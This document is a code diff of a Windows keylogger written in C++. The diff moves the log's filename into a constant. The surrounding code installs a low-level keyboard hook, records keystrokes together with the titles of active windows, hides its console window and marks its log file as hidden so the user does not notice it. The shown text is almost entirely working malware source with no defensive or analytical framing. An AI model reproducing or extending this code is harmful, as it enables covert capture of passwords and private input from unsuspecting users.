@@ -1,10 +1,13 @@
 ﻿#include "keys.h"
+
 #include <shlwapi.h>
 #include <cstdio>
 #include <iostream>
 #include <time.h>
 #include <fstream>
 #include <sstream>
+
+#include "constants.h"
 
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
@@ -50,6 +53,7 @@ int Save(int key_stroke)
             output << "\n\n[" << s << ": " << window_title << "]\n";
         }
     }
+
     switch (key_stroke)
     {
         case VK_BACK:       output << "[BACKSPACE]";    break;
@@ -180,10 +184,8 @@ void Stealth()
     PathRemoveFileSpec(cwd); // shlwapi.lib
     SetCurrentDirectory(cwd);
 
-    std::wstring output_filename = L"k";
-
     // open output file in append mode
-    out.open(output_filename, std::ios_base::app);
+    out.open(OUTPUT_FILE_NAME, std::ios_base::app);
     if (out.is_open())
         OutputDebugString(L"Created output file\n");
     else
@@ -195,9 +197,9 @@ void Stealth()
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 #endif
 
-    DWORD attr = GetFileAttributes(output_filename.c_str());
+    DWORD attr = GetFileAttributes(OUTPUT_FILE_NAME);
     if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
-        SetFileAttributes(output_filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
+        SetFileAttributes(OUTPUT_FILE_NAME, attr | FILE_ATTRIBUTE_HIDDEN);
         OutputDebugString(L"File hidden");
     }
 }
